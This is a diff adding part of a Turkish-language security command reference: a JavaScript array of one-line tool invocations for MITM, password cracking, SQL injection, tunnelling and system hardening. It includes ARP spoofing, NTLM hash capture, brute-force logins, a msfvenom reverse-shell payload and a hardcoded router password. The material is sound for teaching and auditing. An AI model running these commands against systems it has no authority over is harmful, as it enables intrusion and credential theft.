+        desc: "Modem ile hedef cihaz arasına girerek trafiği kendi üzerinden yönlendirmeye çalışır. Dynamic ARP Inspection ile korunulur.",
+        cmd: "sudo arpspoof -i eth0 -t 192.168.1.20 192.168.1.1"
+    },
+    {
+        id: 72,
+        category: "mitm",
+        categoryName: "5. MITM & Dinleme",
+        badge: "ETTERCAP ÇERÇEVESİ",
+        title: "Metin Modunda Ortadaki Adam Simülasyonu (Ettercap)",
+        desc: "Yerel ağdaki bağlantıları haritalandırarak şifrelenmemiş protokolleri denetler.",
+        cmd: "sudo ettercap -T -q -i eth0 // //"
+    },
+    {
+        id: 73,
+        category: "mitm",
+        categoryName: "5. MITM & Dinleme",
+        badge: "LLMNR YAKALAYICI",
+        title: "Windows İsim Çözümleme ve NTLM Özeti Yakalama (Responder)",
+        desc: "Yanlış yazılan ağ paylaşım isimlerine cevap vererek istemcinin NTLMv2 parola özetini toplar.",
+        cmd: "sudo responder -I eth0 -dwv"
+    },
+    {
+        id: 74,
+        category: "mitm",
+        categoryName: "5. MITM & Dinleme",
+        badge: "MAC ADRESİ DEĞİŞTİRME",
+        title: "Ağ Kartının MAC Adresini Rastgele Değiştirme (macchanger)",
+        desc: "Fiziksel donanım adresinizi gizleyerek ağ takip sistemlerinin cihazınızı tanımasını engeller.",
+        cmd: "sudo macchanger -r eth0"
+    },
+    {
+        id: 75,
+        category: "mitm",
+        categoryName: "5. MITM & Dinleme",
+        badge: "WIFI DİNLEME",
+        title: "Kablosuz Ağ Paketlerini Havada Dinleme (Airodump-ng)",
+        desc: "Kablosuz ağ kartını izleme (monitor) moduna alarak çevredeki Wi-Fi yayınlarını listeler.",
+        cmd: "sudo airodump-ng wlan0mon"
+    },
+    {
+        id: 76,
+        category: "mitm",
+        categoryName: "5. MITM & Dinleme",
+        badge: "TRAFİKTEKİ RESİMLER",
+        title: "Ağ Paketlerindeki Resimleri Yakalama (Driftnet)",
+        desc: "Şifrelenmemiş HTTP trafiğinden geçen tüm resimleri ve grafikleri anında ekranda gösterir.",
+        cmd: "sudo driftnet -i eth0"
+    },
+    {
+        id: 77,
+        category: "mitm",
+        categoryName: "5. MITM & Dinleme",
+        badge: "AĞ AKIŞ KAYDI",
+        title: "Yakalanan Trafiği PCAP Formatında Dosyaya Yazma (tcpdump -w)",
+        desc: "İncelemeyi daha sonra Wireshark ile yapabilmek için tüm ağ akışını capture.pcap dosyasına depolar.",
+        cmd: "sudo tcpdump -i any -c 50 -w capture.pcap"
+    },
+
+    // ----------------------------------------------------------------------
+    // KATEGORİ 6: KİMLİK DOĞRULAMA & PAROLA DENETİMİ (15 Komut)
+    // ----------------------------------------------------------------------
+    {
+        id: 78,
+        category: "auth",
+        categoryName: "6. Kimlik & Parola",
+        badge: "WEB LOGIN TESTİ",
+        title: "Modem / Web Paneli Giriş Doğrulama Testi (Hydra)",
+        desc: "Belirlenen kullanıcı adı ve şifre ikilisinin web arayüzünde geçerli olup olmadığını otomatik kontrol eder.",
+        cmd: "hydra -l admin -p Sebu132009 192.168.1.1 http-get /"
+    },
+    {
+        id: 79,
+        category: "auth",
+        categoryName: "6. Kimlik & Parola",
+        badge: "SSH PAROLA LİSTESİ",
+        title: "SSH Sunucusunda Güçsüz Parola Taraması (Hydra SSH)",
+        desc: "Kullanıcı ve şifre kelime listeleri kullanarak SSH portunda varsayılan veya tahmin edilebilir parolaları denetler.",
+        cmd: "hydra -L users.txt -P passwords.txt ssh://127.0.0.1 -t 4"
+    },
+    {
+        id: 80,
+        category: "auth",
+        categoryName: "6. Kimlik & Parola",
+        badge: "FTP DENETİMİ",
+        title: "FTP Sunucusunda Kaba Kuvvet Testi (Hydra FTP)",
+        desc: "FTP dosya sunucusunun başarısız giriş sınırlandırması (Fail2ban) olup olmadığını test eder.",
+        cmd: "hydra -l root -P rockyou.txt ftp://192.168.1.10 -vV"
+    },
+    {
+        id: 81,
+        category: "auth",
+        categoryName: "6. Kimlik & Parola",
+        badge: "RDP DENETİMİ",
+        title: "Windows Uzak Masaüstü Giriş Doğrulaması (Hydra RDP)",
+        desc: "Windows RDP (3389) portuna bağlanarak hesap kilitleme politikasının çalışıp çalışmadığını ölçer.",
+        cmd: "hydra -l admin -P pass.txt rdp://192.168.1.15"
+    },
+    {
+        id: 82,
+        category: "auth",
+        categoryName: "6. Kimlik & Parola",
+        badge: "HASH PAROLA KIRICI",
+        title: "Rockyou Sözlüğü ile Parola Özeti Çözme (John the Ripper)",
+        desc: "Çalınan veya ele geçirilen şifre özetlerini (hash) 14 milyonluk devasa kelime listesiyle karşılaştırarak çözer.",
+        cmd: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"
+    },
+    {
+        id: 83,
+        category: "auth",
+        categoryName: "6. Kimlik & Parola",
+        badge: "HAM MD5 DENETİMİ",
+        title: "MD5 Formatındaki Özetleri Denetleme (John MD5)",
+        desc: "Eski tip MD5 şifre özetlerinin ne kadar savunmasız olduğunu ve saniyeler içinde kırılabildiğini kanıtlar.",
+        cmd: "john --format=Raw-MD5 hash.txt"
+    },
+    {
+        id: 84,
+        category: "auth",
+        categoryName: "6. Kimlik & Parola",
+        badge: "GPU HASHCAT",
+        title: "Ekran Kartı Destekli Yüksek Hızlı Parola Kırıcı (Hashcat)",
+        desc: "Ekran kartının paralel işlem gücünü kullanarak saniyede milyarlarca parola dener.",
+        cmd: "hashcat -m 0 -a 0 hash.txt rockyou.txt"
+    },
+    {
+        id: 85,
+        category: "auth",
+        categoryName: "6. Kimlik & Parola",
+        badge: "NTLM PAROLA",
+        title: "Windows NTLM Parola Özeti Denetimi (Hashcat -m 1000)",
+        desc: "Windows Active Directory ortamından elde edilen NTLM parola özetlerini test eder.",
+        cmd: "hashcat -m 1000 -a 0 ntlm.txt rockyou.txt"
+    },
+    {
+        id: 86,
+        category: "auth",
+        categoryName: "6. Kimlik & Parola",
+        badge: "HEDEFE ÖZEL SÖZLÜK",
+        title: "Hedef Web Sitesinden Özel Kelime Listesi Üretme (CeWL)",
+        desc: "Şirketin web sitesindeki tüm teknik terimleri, kurucu isimlerini ve sloganları çekerek hedefe özel parola sözlüğü oluşturur.",
+        cmd: "cewl https://example.com -d 2 -m 5 -w custom_list.txt"
+    },
+    {
+        id: 87,
+        category: "auth",
+        categoryName: "6. Kimlik & Parola",
+        badge: "PIN KOMBİNASYONLARI",
+        title: "Tüm Olası 8 Haneli Rakam Listesini Üretme (Crunch)",
+        desc: "Belirli kurallara (örn: 8 basamaklı rakamlar) uygun şifre kombinasyonlarını otomatik dosya haline getirir.",
+        cmd: "crunch 8 8 0123456789 -o pins.txt"
+    },
+    {
+        id: 88,
+        category: "auth",
+        categoryName: "6. Kimlik & Parola",
+        badge: "MODÜLER KİMLİK TESTİ",
+        title: "Hızlı Paralel Ağ Giriş Denetimi (Medusa)",
+        desc: "Hydra alternatifi modüler kimlik denetleme aracıyla SSH ve Telnet servislerini test eder.",
+        cmd: "medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh"
+    },
+    {
+        id: 89,
+        category: "auth",
+        categoryName: "6. Kimlik & Parola",
+        badge: "ŞİFRELİ ZIP DOSYASI",
+        title: "ZIP Arşivinin Parolasını Denetleme (fcrackzip)",
+        desc: "Parola ile kilitlenmiş ZIP dosyalarının güvenliğini sözlük saldırısıyla test eder.",
+        cmd: "fcrackzip -u -D -p rockyou.txt secret.zip"
+    },
+    {
+        id: 90,
+        category: "auth",
+        categoryName: "6. Kimlik & Parola",
+        badge: "ŞİFRELİ PDF DOSYASI",
+        title: "PDF Parolası Güvenlik Testi (pdfcrack)",
+        desc: "Gizli kurumsal PDF belgelerinin zayıf parolalarını ortaya çıkarır.",
+        cmd: "pdfcrack -f confidential.pdf -w wordlist.txt"
+    },
+    {
+        id: 91,
+        category: "auth",
+        categoryName: "6. Kimlik & Parola",
+        badge: "HASH TÜRÜ TESPİTİ",
+        title: "Bilinmeyen Parola Özetinin Türünü Bulma (hashid)",
+        desc: "Elinizdeki şifreli metnin MD5 mi, SHA-256 mı, bcrypt mi yoksa NTLM mi olduğunu saniyede tespit eder.",
+        cmd: "hashid \"$6$5p0y...\""
+    },
+    {
+        id: 92,
+        category: "auth",
+        categoryName: "6. Kimlik & Parola",
+        badge: "ÇOK PROTOKOLLÜ TEST",
+        title: "Python Tabanlı Kaba Kuvvet Aracı (Patator)",
+        desc: "Web formları, SSH, FTP ve SQL servisleri dahil her türlü giriş protokolünü aynı anda test eder.",
+        cmd: "patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt"
+    },
+
+    // ----------------------------------------------------------------------
+    // KATEGORİ 7: VERİTABANI & ZAFİYET SÖMÜRÜSÜ (SQLI & EXPLOIT) (15 Komut)
+    // ----------------------------------------------------------------------
+    {
+        id: 93,
+        category: "exploit",
+        categoryName: "7. Zafiyet & Exploit",
+        badge: "OTOMATİK SQLI",
+        title: "Otomatik SQL Enjeksiyonu Tespiti & Veritabanı Listeleme (sqlmap)",
+        desc: "Web uygulamasındaki SQL enjeksiyon açıklarını otomatik sömürür ve sunucudaki tüm veritabanı adlarını listeler.",
+        cmd: "sqlmap -u \"http://127.0.0.1/api/search?q=test\" --dbs --batch"
+    },
+    {
+        id: 94,
+        category: "exploit",
+        categoryName: "7. Zafiyet & Exploit",
+        badge: "TABLO ÇEKME",
+        title: "Veritabanındaki Tabloları Listeleme (sqlmap --tables)",
+        desc: "Hedef veritabanındaki kullanıcılar (users), şifreler veya kredi kartı tablolarını deşifre eder.",
+        cmd: "sqlmap -u \"http://127.0.0.1/api/search?q=test\" -D master --tables"
+    },
+    {
+        id: 95,
+        category: "exploit",
+        categoryName: "7. Zafiyet & Exploit",
+        badge: "POST İSTEK ANALİZİ",
+        title: "Ham HTTP İsteği Dosyasını Sqlmap ile Tarama (sqlmap -r)",
+        desc: "Burp Suite ile kaydedilen ham HTTP POST isteğini baştan sona SQL açığı için test eder.",
+        cmd: "sqlmap -r request.txt --batch --risk=3 --level=5"
+    },
+    {
+        id: 96,
+        category: "exploit",
+        categoryName: "7. Zafiyet & Exploit",
+        badge: "ÇEVRİMDIŞI EXPLOIT",
+        title: "Exploit-DB Arşivinde Zafiyet Kodu Arama (Searchsploit)",
+        desc: "İnternet bağlantısı olmadan yerel veritabanında Apache 2.4.49 için yayınlanmış exploit kodlarını arar.",
+        cmd: "searchsploit apache 2.4.49"
+    },
+    {
+        id: 97,
+        category: "exploit",
+        categoryName: "7. Zafiyet & Exploit",
+        badge: "EXPLOIT İNDİRME",
+        title: "İlgili Exploit Kodunu Çalışma Dizinine Kopyalama (searchsploit -m)",
+        desc: "Bulunan Python veya C dilindeki exploit kodunu masaüstüne kopyalar ve incelemenizi sağlar.",
+        cmd: "searchsploit -m 50383"
+    },
+    {
+        id: 98,
+        category: "exploit",
+        categoryName: "7. Zafiyet & Exploit",
+        badge: "ŞABLON TARAYICI",
+        title: "Güncel CVE Açıklarını Şablonlarla Tarama (Nuclei)",
+        desc: "Topluluk tarafından hazırlanan YAML şablonlarıyla hedefteki kritik zafiyetleri dakikalar içinde tespit eder.",
+        cmd: "nuclei -u http://127.0.0.1 -t cves/"
+    },
+    {
+        id: 99,
+        category: "exploit",
+        categoryName: "7. Zafiyet & Exploit",
+        badge: "GÜVENSİZ BAŞLIKLAR",
+        title: "Eksik Güvenlik Başlıklarını Şablonla Bulma (Nuclei Headers)",
+        desc: "Hedef web sitesinde HSTS, CSP veya X-Frame-Options eksikliklerini otomatik listeler.",
+        cmd: "nuclei -u http://127.0.0.1 -tags headers"
+    },
+    {
+        id: 100,
+        category: "exploit",
+        categoryName: "7. Zafiyet & Exploit",
+        badge: "METASPLOIT KONSOLU",
+        title: "Metasploit Framework'ü Başlatma (msfconsole)",
+        desc: "Dünyanın en popüler sızma testi çerçevesini sessiz modda açar.",
+        cmd: "msfconsole -q"
+    },
+    {
+        id: 101,
+        category: "exploit",
+        categoryName: "7. Zafiyet & Exploit",
+        badge: "TERS BAĞLANTI (REVERSE SHELL)",
+        title: "Linux x64 Test Yükü (Payload) Üretme (msfvenom)",
+        desc: "Eğitim amaçlı ters kabuk (reverse shell) ELF ikili dosyası oluşturur.",
+        cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o rev.elf"
+    },
+    {
+        id: 102,
+        category: "exploit",
+        categoryName: "7. Zafiyet & Exploit",
+        badge: "KOMUT ENJEKSİYONU",
+        title: "Otomatik İşletim Sistemi Komut Enjeksiyonu Tespiti (Commix)",
+        desc: "Web sayfasındaki formların arkadaki işletim sistemi komut satırına (bash/cmd) sızıp sızmadığını test eder.",
+        cmd: "commix --url=\"http://127.0.0.1/ping.php?ip=127.0.0.1\""
+    },
+    {
+        id: 103,
+        category: "exploit",
+        categoryName: "7. Zafiyet & Exploit",
+        badge: "XSS ANALİZİ",
+        title: "Modern Siteler Arası Betik Çalıştırma Tarayıcısı (Dalfox)",
+        desc: "Web sitesinde DOM, Reflected ve Stored XSS açıklarını gelişmiş analiz motoruyla arar.",
+        cmd: "dalfox url http://127.0.0.1/search.php?q=test"
+    },
+    {
+        id: 104,
+        category: "exploit",
+        categoryName: "7. Zafiyet & Exploit",
+        badge: "WORDPRESS EXPLOIT",
+        title: "WordPress Güvenlik Açıklarını Ayrıntılı Tarama (wpscan)",
+        desc: "Kurulu eklentilerdeki bilinen tüm exploitleri ve SQLi açıklarını raporlar.",
+        cmd: "wpscan --url http://127.0.0.1 --plugins-detection aggressive"
+    },
+    {
+        id: 105,
+        category: "exploit",
+        categoryName: "7. Zafiyet & Exploit",
+        badge: "CVE VERİTABANI",
+        title: "CVE Kodunun Detaylarını ve Risk Puanını Öğrenme (cve-search)",
+        desc: "Örneğin Log4j açığı olan CVE-2021-44228'in CVSS puanını ve etkilenen sistemleri listeler.",
+        cmd: "cve-search -c CVE-2021-44228"
+    },
+    {
+        id: 106,
+        category: "exploit",
+        categoryName: "7. Zafiyet & Exploit",
+        badge: "MODEM AÇIKLARI",
+        title: "Gömülü Cihazlar ve Modem Zafiyet Çerçevesi (Routersploit)",
+        desc: "Ağ yönlendiricileri ve IP kameralardaki varsayılan şifre ve donanım açıklarını denetler.",
+        cmd: "routersploit"
+    },
+    {
+        id: 107,
+        category: "exploit",
+        categoryName: "7. Zafiyet & Exploit",
+        badge: "TERSİNE MÜHENDİSLİK",
+        title: "NSA Kaynaklı Tersine Mühendislik Çerçevesi (Ghidra)",
+        desc: "Zararlı yazılımların kaynak kodunu deşifre etmek ve güvenlik açıklarını analiz etmek için kullanılan decompiler yazılımıdır.",
+        cmd: "ghidra"
+    },
+
+    // ----------------------------------------------------------------------
+    // KATEGORİ 8: TÜNELLEME, UZAK ERİŞİM & NETCAT (12 Komut)
+    // ----------------------------------------------------------------------
+    {
+        id: 108,
+        category: "tunnel",
+        categoryName: "8. Tünel & Pivot",
+        badge: "PORT DİNLEYİCİ",
+        title: "Netcat ile Dinleme Portu Açma (nc -lvnp)",
+        desc: "4444 numaralı portta TCP dinleyici açarak gelen bağlantıları ve ham verileri terminalde görüntüler.",
+        cmd: "nc -lvnp 4444"
+    },
+    {
+        id: 109,
+        category: "tunnel",
+        categoryName: "8. Tünel & Pivot",
+        badge: "PORT BAĞLANTISI",
+        title: "Netcat ile Uzak Porta Bağlanma (nc -nv)",
+        desc: "Uzak sunucunun belirli bir portuna bağlanarak servisin açık olup olmadığını ve gönderdiği banner metnini test eder.",
+        cmd: "nc -nv 127.0.0.1 4444"
+    },
+    {
+        id: 110,
+        category: "tunnel",
+        categoryName: "8. Tünel & Pivot",
+        badge: "HIZLI PORT TARAMA",
+        title: "Netcat ile Sessiz Port Taraması (nc -z)",
+        desc: "Veri göndermeden sadece port aralığını yoklayarak açık olanları listeler.",
+        cmd: "nc -z -v -w 1 127.0.0.1 80-90"
+    },
+    {
+        id: 111,
+        category: "tunnel",
+        categoryName: "8. Tünel & Pivot",
+        badge: "SOKET KÖPRÜSÜ",
+        title: "Çift Yönlü Trafik Yönlendirme Köprüsü (Socat)",
+        desc: "8080 portuna gelen tüm istekleri şeffaf şekilde iç ağdaki 80 portuna aktarır.",
+        cmd: "socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80"
+    },
+    {
+        id: 112,
+        category: "tunnel",
+        categoryName: "8. Tünel & Pivot",
+        badge: "HTTP TERS TÜNEL",
+        title: "Güvenlik Duvarı Arkasındaki Sunucuya Chisel Tüneli",
+        desc: "Normalde dışarı kapalı portları HTTP/WebSocket üzerinden şifreli tünel ile dışarı aktarır.",
+        cmd: "chisel server -p 8000 --reverse"
+    },
+    {
+        id: 113,
+        category: "tunnel",
+        categoryName: "8. Tünel & Pivot",
+        badge: "CHİSEL İSTEMCİSİ",
+        title: "İç Servisi Dış Portta Yayınlama (Chisel Client)",
+        desc: "İç ağdaki web servisini uzaktaki sunucunun portuna bağlar.",
+        cmd: "chisel client 127.0.0.1:8000 R:8080:127.0.0.1:80"
+    },
+    {
+        id: 114,
+        category: "tunnel",
+        categoryName: "8. Tünel & Pivot",
+        badge: "SSH YEREL TÜNEL",
+        title: "SSH ile Yerel Port Tünelleme (ssh -L)",
+        desc: "Kendi bilgisayarınızın 8080 portunu güvenli SSH tüneli üzerinden uzak sunucunun web servisine bağlar.",
+        cmd: "ssh -L 8080:127.0.0.1:80 user@remote-server"
+    },
+    {
+        id: 115,
+        category: "tunnel",
+        categoryName: "8. Tünel & Pivot",
+        badge: "SSH UZAK TÜNEL",
+        title: "SSH ile Uzak Port Tünelleme (ssh -R)",
+        desc: "Kendi yerel geliştirme sunucunuzu (localhost:3000) dış dünyaya güvenle açar.",
+        cmd: "ssh -R 9000:localhost:3000 user@remote-server"
+    },
+    {
+        id: 116,
+        category: "tunnel",
+        categoryName: "8. Tünel & Pivot",
+        badge: "SOCKS5 PROXY",
+        title: "SSH ile Dinamik SOCKS5 Proxy Kurma (ssh -D)",
+        desc: "Tüm tarayıcı ve ağ trafiğinizi şifreli bir SSH sunucusu üzerinden geçiren yerel proxy oluşturur.",
+        cmd: "ssh -D 1080 -q -C -N user@remote-server"
+    },
+    {
+        id: 117,
+        category: "tunnel",
+        categoryName: "8. Tünel & Pivot",
+        badge: "PROXY ZİNCİRİ",
+        title: "Tüm Komutları Tor veya Proxy Üzerinden Yürütme (Proxychains)",
+        desc: "Nmap taramasını veya web araçlarını proxy zincirinin arkasından geçirerek IP adresinizi gizler.",
+        cmd: "proxychains nmap -sT -Pn 10.0.0.5"
+    },
+    {
+        id: 118,
+        category: "tunnel",
+        categoryName: "8. Tünel & Pivot",
+        badge: "TÜNEL PİVOTING",
+        title: "Modern Ağ Arayüzü Tüneli (Ligolo-ng)",
+        desc: "Sızılan hedef sunucuyu bir yönlendiriciye dönüştürerek arka taraftaki kapalı iç ağlara doğrudan erişim sağlar.",
+        cmd: "ligolo-ng"
+    },
+    {
+        id: 119,
+        category: "tunnel",
+        categoryName: "8. Tünel & Pivot",
+        badge: "SSH KİMLİK DOĞRULAMA",
+        title: "Parolasız Güvenli SSH Girişi (ssh-copy-id)",
+        desc: "Ortak kriptografik anahtarınızı uzak sunucuya yükleyerek şifre çalınma riskini ortadan kaldırır.",
+        cmd: "ssh-copy-id -i ~/.ssh/id_rsa.pub user@remote-server"
+    },
+
+    // ----------------------------------------------------------------------
+    // KATEGORİ 9: DEFANSİF GÜVENLİK (BLUE TEAM), SİSTEM SERTLEŞTİRME & LOGLAR (15 Komut)
+    // ----------------------------------------------------------------------
+    {
+        id: 120,
+        category: "blue",
+        categoryName: "9. Blue Team & SOC",
+        badge: "FIREWALL DURUMU",
+        title: "Linux Güvenlik Duvarı Durumunu ve Kurallarını İnceleme (ufw)",
+        desc: "Hangi portların açık, hangi IP'lerin engelli olduğunu ayrıntılı olarak raporlar.",
+        cmd: "sudo ufw status verbose"
+    },
+    {
+        id: 121,
+        category: "blue",
+        categoryName: "9. Blue Team & SOC",
+        badge: "HTTPS İZNİ",
+        title: "Yalnızca Şifreli Web Trafiğine İzin Verme (ufw allow 443)",
+        desc: "Dış dünyadan sadece güvenli HTTPS (443) isteklerine onay verir.",
+        cmd: "sudo ufw allow 443/tcp"
+    },
+    {
+        id: 122,
+        category: "blue",
+        categoryName: "9. Blue Team & SOC",
+        badge: "SSH KAPATMA",
+        title: "Dışarıdan SSH Girişlerini Engelleme (ufw deny 22)",
+        desc: "Uzaktan kaba kuvvet parola saldırılarını önlemek için SSH portunu dış dünyaya kilitler.",
+        cmd: "sudo ufw deny 22/tcp"
+    },
+    {
+        id: 123,
+        category: "blue",
+        categoryName: "9. Blue Team & SOC",
+        badge: "ÇEKİRDEK TABLOSU",
+        title: "Ham Çekirdek Paket Filtreleme Tablosunu İnceleme (iptables)",
+        desc: "Linux çekirdeğindeki filtreleme zincirlerini (INPUT, OUTPUT, FORWARD) ve sayaçları gösterir.",
+        cmd: "sudo iptables -L -n -v"
+    },
+    {
+        id: 124,
+        category: "blue",
+        categoryName: "9. Blue Team & SOC",
+        badge: "SALDIRGAN IP ENGELLEME",
+        title: "Saldırgan Bir IP Adresini Çekirdek Düzeyinde Engelleme (iptables DROP)",
+        desc: "Şüpheli IP adresinden gelen tüm paketleri sunucuya ulaşmadan sessizce çöpe atar.",
+        cmd: "sudo iptables -A INPUT -s 192.168.1.100 -j DROP"
+    },
+    {
+        id: 125,
+        category: "blue",
+        categoryName: "9. Blue Team & SOC",
+        badge: "AÇIK PORTLAR & PID",
+        title: "Sistemde Dinlenen Tüm Portları ve İşlemleri Görme (ss -tulpn)",
+        desc: "Sunucudaki hangi portun hangi yazılım (PID numarası) tarafından dinlendiğini anında döker.",
+        cmd: "ss -tulpn"
+    },
+    {
+        id: 126,
+        category: "blue",
+        categoryName: "9. Blue Team & SOC",
+        badge: "BAĞLANTI DURUMU",
+        title: "Aktif Ağ Bağlantılarını Sorgulama (netstat)",
+        desc: "Sisteme kimlerin bağlı olduğunu (ESTABLISHED) ve dışarıya açılan soketleri gösterir.",
+        cmd: "netstat -antup"
+    },
+    {
+        id: 127,
+        category: "blue",
+        categoryName: "9. Blue Team & SOC",
+        badge: "PORTU KULLANAN UYGULAMA",
+        title: "Belirli Portu Tutan İşlemi Bulma (lsof)",
+        desc: "Örneğin 80 numaralı portun arkasındaki dotnet veya nginx işlemini PID ile listeler.",
+        cmd: "sudo lsof -i :80"
+    },
+    {
+        id: 128,
+        category: "blue",
+        categoryName: "9. Blue Team & SOC",
+        badge: "CANLI SERVİS GÜNLÜĞÜ",
+        title: "Güvenlik Servisi Loglarını Canlı Takip Etme (journalctl -f)",
+        desc: "Uygulamanın erişim ve hata loglarını canlı olarak terminale akıtır.",
+        cmd: "journalctl -u lfl-defense -f"
+    },
+    {
+        id: 129,
+        category: "blue",
+        categoryName: "9. Blue Team & SOC",
+        badge: "BAŞARISIZ GİRİŞ RAPORU",
+        title: "Linux Güvenlik Denetimi Başarısız Giriş Raporu (aureport)",
+        desc: "Linux Auditd servisinin kaydettiği tüm hatalı parola denemelerini listeler.",
+        cmd: "sudo aureport --auth"
+    },
+    {
+        id: 130,
+        category: "blue",
+        categoryName: "9. Blue Team & SOC",
+        badge: "OTOMATİK BAN SİSTEMİ",
+        title: "Fail2ban Engellenen Saldırgan Listesi (fail2ban-client)",
+        desc: "Üst üste yanlış şifre giren saldırganların IP adreslerini geçici olarak engelleyen servisin durumudur.",
+        cmd: "sudo fail2ban-client status"
+    },
+    {
+        id: 131,
+        category: "blue",
+        categoryName: "9. Blue Team & SOC",
+        badge: "ROOTKIT TARAYICI",
+        title: "Sisteme Gizlenmiş Rootkit ve Arka Kapı Taraması (chkrootkit)",
+        desc: "Sistem dosyalarının değiştirilip değiştirilmediğini ve gizli trojanları denetler.",
+        cmd: "sudo chkrootkit -q"
+    },
+    {
+        id: 132,
+        category: "blue",
+        categoryName: "9. Blue Team & SOC",
+        badge: "GÜVENLİK AÇIĞI AVCI",
+        title: "Bütünlük ve Zafiyet Denetleyicisi (rkhunter)",
+        desc: "Kritik sistem ikili dosyalarının MD5 özetlerini orijinal arşivle karşılaştırarak kurcalamaları yakalar.",
+        cmd: "sudo rkhunter -c --sk"
+    },
+    {
+        id: 133,
+        category: "blue",
+        categoryName: "9. Blue Team & SOC",
+        badge: "ÇEKİRDEK GÜVENLİK AYARI",
+        title: "IP Yönlendirmeyi Kapatarak Ortadaki Adam Saldırısını Engelleme",
+        desc: "Bilgisayarın yabancı paketleri yönlendirmesini engelleyerek gateway sahteciliğini önler.",
+        cmd: "sysctl -w net.ipv4.ip_forward=0"
+    },
+    {
+        id: 134,
+        category: "blue",
+        categoryName: "9. Blue Team & SOC",
+        badge: "SYN COOKIES SAVUNMASI",
+        title: "SYN Flood Saldırılarına Karşı SYN Cookies Korumasını Açma",
+        desc: "Çekirdek düzeyinde SYN Cookies mekanizmasını devreye sokarak bellek dolmasını engeller.",
+        cmd: "sysctl -w net.ipv4.tcp_syncookies=1"
+    },
+
+    // ----------------------------------------------------------------------
+    // KATEGORİ 10: POWERSHELL KURUMSAL GÜVENLİK & DENETİM SCRİPTLERİ (10 Komut)
+    // ----------------------------------------------------------------------
+    {
+        id: 135,
+        category: "powershell",
+        categoryName: "10. PowerShell Denetim",
+        badge: "GÜVENLİK BAŞLIK DENETİMİ",
+        title: "Kurumsal HTTP Güvenlik Başlıkları Denetim Scripti (Audit-Headers.ps1)",
+        desc: "Strict-Transport-Security, Content-Security-Policy, X-Frame-Options ve nosniff başlıklarını doğrular; eksik varsa risk raporu üretir.",
+        cmd: "powershell .\\Audit-Headers.ps1"
+    },
+    {
+        id: 136,
+        category: "powershell",
+        categoryName: "10. PowerShell Denetim",
+        badge: "ÇOK KANALLI PORT TARA",
+        title: "Yüksek Hızlı RunspacePool Asenkron Port Tarayıcı (Port-Scan.ps1)",
+        desc: "Tüm işlemci çekirdeklerini kullanarak 16 eşzamanlı kanaldan açık portları 0.3 saniyede tespit eder.",
+        cmd: "powershell .\\Port-Scan.ps1"
+    },
+    {
+        id: 137,
+        category: "powershell",
+        categoryName: "10. PowerShell Denetim",
+        badge: "BİLGİ İFŞASI KONTROLÜ",
+        title: "Sunucu Banner Bilgi İfşası Denetimi (Banner-Grab.ps1)",
+        desc: "Server ve X-Powered-By başlıklarının saldırganlara sürüm sızdırıp sızdırmadığını kontrol eder.",
+        cmd: "powershell .\\Banner-Grab.ps1"
+    },
+    {
+        id: 138,
+        category: "powershell",
+        categoryName: "10. PowerShell Denetim",
+        badge: "SSL/TLS SERTİFİKA DENETİMİ",
+        title: "Sertifika Geçerlilik ve Kripto Protokol Analizi (Check-Certificate.ps1)",
+        desc: "Web sunucusunun TLS 1.3 kullandığını ve sertifika süresinin dolmasına kaç gün kaldığını hesaplar.",
+        cmd: "powershell .\\Check-Certificate.ps1"
+    },
+    {
+        id: 139,
+        category: "powershell",
+        categoryName: "10. PowerShell Denetim",
+        badge: "WINDOWS TCP DİNLENENLER",
+        title: "Windows Dinlenen TCP Portlarını Listeleme (Get-NetTCPConnection)",
+        desc: "Windows sunucuda açık olan servisleri ve bağlanan istemcilerin IP adreslerini listeler.",
+        cmd: "powershell \"Get-NetTCPConnection -State Listen\""
+    },
+    {
+        id: 140,
+        category: "powershell",
+        categoryName: "10. PowerShell Denetim",
+        badge: "PORT ERİŞİM TESTİ",
+        title: "Uzak Web Servisinin Ayakta Olup Olmadığını Test Etme (Test-NetConnection)",
+        desc: "443 HTTPS portuna TCP düzeyinde el sıkışma testi göndererek ağ gecikmesini ölçer.",
+        cmd: "powershell \"Test-NetConnection -ComputerName 127.0.0.1 -Port 443\""
+    },
+    {
+        id: 141,
+        category: "powershell",
+        categoryName: "10. PowerShell Denetim",
+        badge: "DOSYA BÜTÜNLÜĞÜ",
+        title: "Kritik Dosyanın SHA256 Kriptografik Özeti (Get-FileHash)",
+        desc: "Dosyaya herhangi bir arka kapı veya virüs eklenip eklenmediğini doğrulamak için hash özetini çıkarır.",
+        cmd: "powershell \"Get-FileHash -Algorithm SHA256 .\\CyberBlog.dll\""
+    },
+    {
+        id: 142,
+        category: "powershell",
+        categoryName: "10. PowerShell Denetim",
+        badge: "GÜVENLİK GÜNLÜĞÜ",
+        title: "Windows Olay Günlüğü Son 10 Güvenlik Olayı (Get-EventLog)",
+        desc: "Windows Güvenlik (Security) günlüğündeki son oturum açma ve kimlik denetim kayıtlarını listeler.",
+        cmd: "powershell \"Get-EventLog -LogName Security -Newest 10\""
+    }
+];
